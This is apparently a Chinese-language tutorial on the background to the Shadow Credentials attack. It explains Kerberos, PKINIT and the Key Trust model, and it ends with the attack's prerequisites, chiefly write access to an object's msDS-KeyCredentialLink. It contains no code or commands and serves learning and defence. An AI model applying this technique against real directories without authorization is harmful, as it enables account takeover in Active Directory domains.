Shadow Credentials 初探

前置知识

Kerberos

概述

Kerberos 是一种无密码计算机网络安全身份验证协议，具有身份验证和安全性的功能。

Kerberos 不使用传统的密码验证，而是使用强效、限时密钥加密，多个密钥和第三方服务器来验证客户端-服务器应用程序和身份验证。

Kerberos 主要组成部分为：User/Client , KDC-AS-TGS , Service/Application

KDC

KDC （密钥分发中心）是一种集中式服务器，用于充当Kerberos 的第三方身份验证服务器。KDC中包括一个执行初始身份验证的身份验证服务器AS，一个颁发服务票据并将服务请求用户链接到服务服务器SS的票据授予服务器TGS，以及存储所有已验证用户的详细信息的Kerberos数据库（即所有身份验证信息以及授权）

它是如何工作的？

  1. AS Request : User/Client 要访问服务，会启动 Kerberos 的初始身份验证 （也叫预身份验证，默认开启。如若关闭可能会造成 AS-REP Roasting），如此，会向 Kerberos KDC AS 发出请求AS-REQ 进行初始身份验证，此请求不包含敏感信息，所以为纯文本格式。AS 首先验证客户端是否在 KDC 数据库中，并检索请求中携带的客户端私钥。

    关于预身份验证Pre-Authentication

    在Kerberos 中默认启用，请求中会包含由用户密码派生密钥加密的时间戳。

  2. AS Response : AS 通过在数据库中查找发起请求的客户端的用户名来进行预身份验证，如果找到，则会颁发票证授予票证TGT和会话密钥，否则会启动身份验证失败。

    关于会话密钥 session key

    会话密钥是随机生成的加密和解密密钥，用于保证通信的安全。

    关于 AS-REP

    包含 TGT，EncPart

    关于票证授予票证TGT

    此时通过验证之后 AS-REP返回的数据中包含 TGT 和 会话密钥。而TGT是 AS 和 TGT 之间的密钥加密后的票证，给TGS使用。

    其中的 session key 是交由 TGS使用

    关于 EncPart

    使用的密钥是客户端的，客户端能用自己的密码解密。拿到会话密钥和TGT。

  3. Service Ticket Request : 通过AS身份验证后，客户端会向 TGS 发送请求服务票证，此请求必须包含 TGT

  4. Service Ticket Response : 如果 TGS 可以对客户端进行身份验证，那么会发送针对服务请求的票据和凭证，以允许客户端访问服务。此传输使用的是用户和服务的会话密钥加密的。

  5. Application Server Request : 客户端请求应用程序服务器，必须包含服务票据ST。如果验证通过则允许访问。

  6. Application Server Response：返回响应

任何票据都是携带时间戳的，只能在特定时间内使用。在这段时间内无需再次执行身份验证。

PKINIT

PKINIT 是 Kerberos 的一种扩展，使用非对称密钥加密。

启用这种扩展的简单认证流程：

  1. 客户端具有私钥-公钥对，在预身份验证阶段，客户端使用自己的私钥对预身份验证数据（AuthPack）进行签名，其中包含着时间戳，客户端信息，证书以及客户端公钥。

  2. KDC接收到使用客户端的公钥进行签名验证是否合法，并且使用客户端的公钥加密生成的Session Key。

  3. 身份验证通过则返回AS-REP，此时客户端使用私钥解密Session Key

它还支持俩种方法交换会话密钥：

  1. Diffie-Hellman (DH) : 传递DH密钥以允许KDC和客户端安全地建立共享会话密钥，可以有效阻止中间人攻击，如果使用这种方法交换会话密钥，那么在认证流程的请求阶段中的预身份验证数据中会包含DH公钥，而在KDC中会使用DH私钥与客户端的DH公钥 计算出共享密钥，用这个共享密钥对 EncPart中的Session Key 进行加密。接着客户端使用自己的DH私钥进行解密。
  2. Public Key Encryption : 使用KDC的私钥和客户端的公钥来生成会话密钥。

Key Trust model

在 Key Trust Model 下，在客户端中拥有一个存储公钥的属性msDs-KeyCredentialLink。（注意，这个属性在Windows Server 2016 就已经存在，不局限于PKINIT）此为一个多值属性，但在这篇文章中我们重点关注它能够存储公钥信息这个特点。

此模型的存在不再需要为每个客户端颁发证书，但域控必须有用于会话密钥交换的证书。(默认情况下，存在AD CS和CA，域控会自动获取证书)。

那么这个模型下的验证流程是怎样的？

  1. 客户端发送AS-REQ。其中携带着包含客户端公钥和客户端私钥加密的时间戳的Pre-Authentication。
  2. KDC接收AS-REQ，针对msDS-KeyCredentialLink 进行公钥验证，并且对时间戳进行解密并验证。
  3. KDC响应AS-REP，返回TGT与Session Key

而在密钥信任模型与PKINIT的结合下 （前者支持无密码验证，后者支持证书验证。俩者结合实现了无密码基于公钥的认证），我们如果能够对msDS-KeyCredentialLink进行修改，则可以获得TGT与Session Key。

先决条件

  • 目标DC必须有自己的证书
  • 攻击者必须对目标用户或计算机对象的msDS-KeyCredentialLink具有修改权限。
  • 拥有ADCS，且支持 SmartcardLogon 与 SmartcardUser 的证书模板。
  • 是否启用PKINIT （Windows Server 2008之后默认启用）
